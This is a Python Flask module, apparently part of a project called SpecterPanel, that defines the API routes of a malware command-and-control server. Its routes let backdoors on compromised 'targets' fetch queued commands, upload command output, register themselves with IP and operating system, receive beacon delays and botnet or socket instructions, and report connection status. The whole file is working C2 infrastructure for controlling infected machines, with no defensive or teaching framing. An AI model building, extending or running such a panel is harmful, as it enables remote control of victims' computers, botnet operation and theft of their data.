# -*- coding: utf-8 -*-
"""
SpecterPanel - API Routes
This module defines the API routes for the SpecterPanel application.
These routes handle various API requests related to command execution,
target registration, and instruction retrieval.
It includes routes for receiving commands from backdoors,
saving command outputs, managing botnets, and handling socket connections.
It uses Flask's Blueprint to organize the API routes and SQLAlchemy for database interactions.
Routes are defined for:
- Receiving and executing commands from backdoors
- Saving command outputs from targets
- Retrieving botnet information for targets
- Registering new targets with the API
- Retrieving instructions for targets
- Managing socket connections for targets
This module also includes error handling and logging for API requests.
Routes list:
- /api/ApiCommand/<target_name>: Receives commands from backdoors
- /api/Apicommand/save_output: Saves command outputs from targets
- /api/BotNet/<target_name>: Retrieves botnet information for targets
- /api/registor_target: Registers new targets with the API
- /api/get_instraction/<target_name>: Retrieves instructions for targets
- /api/socket/<target_name>: Manages socket connections for targets
"""

from flask import Blueprint,jsonify,request,session
from sqlalchemy.orm import sessionmaker
from datetime import datetime

from db.modle import APICommand,APILink,ApiToken,Instraction,Targets,BotNet
from db.mange_db import config,_create_engine
from utility.email_temp import email_temp
from utility.processer import log,getlist,readFromJson,update_output,update_user_info,update_target_info,update_socket_info

emailTemplate = email_temp()

Session = sessionmaker(bind=_create_engine())
_session = Session()

api = Blueprint('api',__name__)

# recive excute command from the backdoor
@api.route('/api/ApiCommand/<target_name>')
def apiCommand(target_name):

    if request.method == 'GET':

        try:

            api_token = request.args.get('token')
            IP = request.args.get('ip')
            opreatingSystem = request.args.get('os')
            valid = getlist(_session.query(ApiToken).filter_by(token=api_token).all(),sp=',')

            if valid:
                apiCommand = getlist(_session.query(APICommand).filter_by(
                        target_name=target_name,
                        condition=config.STUTAS[1]
                    ).all(),
                    sp=','
                )
                print(apiCommand)
                if IP != readFromJson('target-info',target_name)['ip']:
                    update_target_info(target_name,IP,opreatingSystem)
                return {'allCommand': apiCommand},200
            
            else:
                return {'Erorr': 'Invalid api_token or no api token provided'},404
            
        except Exception as e:

            log(f'[ERROR ROUT] : {request.endpoint} error: {str(e)}')
            _session.rollback()

            return {'error': 'Server side Error'},500
        
        finally:
            _session.close()
    
    else:

        return {'Error': 'Unsupported method'},405


@api.route('/api/Apicommand/save_output',methods=['POST'])
def save_output():
    if request.method == 'POST':
        try:
            token = request.json.get('token')
            target_name = request.json.get('target_name')
            IP = request.json.get('ip')
            valid = getlist(_session.query(Targets).filter_by(target_name=target_name,token=token).all(),sp=',')

            if len(valid) != 0:
                outputs = request.json.get('output')
                opreatingSystem = request.json.get('os')

                for output in outputs:
                    update_output(target_name, output[0], output[1])
                    _session.query(APICommand).filter_by(ID=output[0]).update(
                        {
                            'condition' : config.STUTAS[0],
                        }
                    )
                    _session.commit()

                if IP != readFromJson('target-info',target_name)['ip']:
                    update_target_info(target_name,IP,opreatingSystem)

                return {'message': 'Outputs were seved'},200
            
        except Exception as e:

            log(f'[ERROR ROUT] : {request.endpoint} error: {str(e)}')
            return {'Erorr': 'Invalid api_token or no api token provided'},404
    else:
        return {'Error': "Unsupported method or didn't provid target name"},405


@api.route('/api/BotNet/<target_name>')
def BotNet(target_name):
    if request.method == 'GET':
        try:
            token = request.args('token')
            botNets = getlist(_session.query(BotNet).filter_by(target_name=target_name,token=token).all())
            response = {}

            for botNet in botNets:
                response[botNet[-2]] = botNet[-1]
            
            return response,200
        
        except Exception as e:

            log(f'[ERROR ROUT] : {request.endpoint} error: {str(e)}')
            return {'Erorr': 'Invalid api_token or no api token provided'},404
    else:
        return {'Error': "Unsupported method or didn't provid target name"},405


@api.route('/api/registor_target', methods=['POST'])
def registor_target():
    if request.method == 'POST':
        try:
            apitoken = request.json.get('token')
            target_name = request.json.get('target_name')
            IP = request.json.get('ip')
            opratingSystem = request.json.get('os')

            if not apitoken or not target_name:
                return {'Error': 'Token or target_name not provided'}, 400

            # Validate API token
            valid = getlist(_session.query(ApiToken).filter_by(token=apitoken).all(), sp=',')
            print(valid)
            if len(valid) != 0:
                # Append datetime to target_name to make it unique
                target_name = target_name + str(datetime.now()).replace(' ','')
                target = Targets(target_name, valid[0][2].replace(' ',''), apitoken)
                _session.add(target)
                _session.commit()
                update_target_info(target_name,IP,opratingSystem)

                botNet = Instraction(config.ID(),300,target_name,config.INSTRACTION[2],config.STUTAS[1])
                sock = Instraction(config.ID(),300,target_name,config.INSTRACTION[1],config.STUTAS[1])
                web = Instraction(config.ID(),300,target_name,config.INSTRACTION[0],config.STUTAS[1])

                _session.add(botNet)
                _session.add(sock)
                _session.add(web)
                _session.commit()

                return {'target_name': target_name}, 200  # Return 200 OK status

        except Exception as e:
            _session.rollback()
            log(f'[ERROR ROUT] : {request.endpoint} error: {str(e)}')
            return {'Error': 'Internal server error'}, 500  # Return 500 for internal errors

        finally:
            _session.close()

    # Handle unsupported methods
    return {'Error': "Unsupported method or didn't provide target name"}, 405



@api.route('/api/get_instraction/<target_name>')
def instarction(target_name):
    if request.method == 'GET':
        try:
            print('i am the problame')
            token = request.args.get('token')
            IP = request.args.get('ip')
            opratingSystem = request.args.get('os')
            print(token)
            valid = getlist(_session.query(ApiToken).filter_by(token=token).all(), sp=',')

            if len(valid) != 0:

                instraction = getlist(_session.query(Instraction).filter_by(target_name=target_name, stutas=config.STUTAS[0]).all(), sp=',')
                if len(instraction) != 0:
                    if IP != readFromJson('target-info',target_name)['ip']:
                        data = readFromJson('target-info',target_name)['ip']
                        print('updatinting ip',data)
                        update_target_info(target_name,IP,opratingSystem)
                    print('updatinting ip',readFromJson('target-info',target_name)['ip'],'ip',IP)
                    return {'delay': instraction[0][1], 'instraction': instraction[0][3]}, 200
                
                return {'Message': 'No instraction found'}, 404
            else:
                return {'error': 'Invalid api token'}, 403
            
        except Exception as e:
            log(f'[ERROR ROUT] : {request.endpoint} error: {str(e)}')
            return {'Erorr': f'Exception {str(e)}'}, 500
    else:
        return {'Error': "Unsupported method or didn't provid target name"},405


@api.route("/api/socket/<target_name>", methods=['GET', 'POST'])
def socket(target_name=None):
    """
    Render the socket page for a given target.
    Handles token verification if POST data is provided.
    Redirects to login if the user is not authenticated.
    """
    if request.method == "POST":
        is_connect = request.json.get('is_connect')
        token = request.json.get('token')
        
        check_token = getlist(_session.query(ApiToken).filter_by(user_email=session['email']).all(), sp=',')[0]
        if token == check_token[1]:
            targets = getlist(_session.query(Targets).filter_by(target_name=target_name).all(), sp=',')
            instraction = getlist(_session.query(Instraction).filter_by(target_name=target_name).all(), sp=',')
            if targets and instraction:
                _session.query(Instraction).filter_by(
                    target_name=target_name, instraction=config.INSTRACTION[1]
                ).update({'stutas': config.STUTAS[0]})
            _session.commit()
            update_socket_info(token, is_connect)
            return {'status': 'status saved'}, 200
        else:
            return {'error': 'invalid token'}, 403

    elif request.method == 'GET':
        if 'email' not in session:
            return {'error': 'unauthorized'}, 401
        token = request.args.get('token')
        try:
            status = readFromJson('socket-status', token)['status']
            return {'status': status}, 200
        except KeyError:
            return {'status': 'disconnected'}, 200

    # This point should never be reached with defined methods
    return {'error': 'Unsupported method'}, 405
